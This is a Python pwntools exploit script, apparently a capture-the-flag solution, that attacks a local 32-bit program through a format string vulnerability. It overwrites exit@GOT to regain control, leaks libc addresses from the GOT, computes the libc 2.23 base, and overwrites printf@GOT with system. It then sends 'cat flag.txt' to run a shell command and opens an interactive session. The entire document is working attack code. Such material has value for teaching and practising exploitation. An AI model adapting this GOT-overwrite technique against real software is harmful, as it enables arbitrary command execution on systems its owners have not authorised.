#!/usr/bin/env python

from pwn import *

with context.quiet:
    p = process('./program', env = {'LD_PRELOAD': './ld-2.23.so ./libc-2.23.so'})

    p.recvuntil('Give me a string to echo back.\n')

    # overwrite exit@GOT with 0x8048575 (only the lowest two bytes needs to be overwritten)
    exit_got = 0x804a01c
    p.sendline('AA{}%{}x%11$hn'.format(p32(exit_got), u16(p32(0x8048575)[0:2]) - 9))

    p.recvuntil('\n')

    puts_got = 0x804a018
    setbuf_got = 0x804a00c

    # leak setbuf@GOT
    p.sendline('AA{}%12$sBBBB'.format(p32(setbuf_got)))
    setbuf_addr = u32(p.recvuntil('BBBB\n')[6:10])
    print 'setbuf: {}'.format(hex(setbuf_addr))

    # leak puts@GOT
    p.sendline('AA{}%13$sBBBB'.format(p32(puts_got)))
    puts_addr = u32(p.recvuntil('BBBB\n')[6:10])
    print 'puts: {}'.format(hex(puts_addr))

    # using libc database, we can detect the version of libc, which is
    # ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
    libc_base = puts_addr - 0x5f140
    print 'libc base: {}'.format(hex(libc_base))

    # overwrite printf@GOT with system
    printf_got = 0x804a010
    system_addr = libc_base + 0x3a940
    print 'system: {}'.format(hex(system_addr))
    p.sendline('AA{}{}%{}x%14$hn%{}x%15$hn'.format(p32(printf_got), p32(printf_got + 2), \
                                                   u16(p32(system_addr)[0:2]) - 10, \
                                                   u16(p32(system_addr)[2:]) - u16(p32(system_addr)[0:2])))

    p.recvuntil('\n')

    # we can pass any command to system
    p.sendline('cat flag.txt')

    p.interactive()

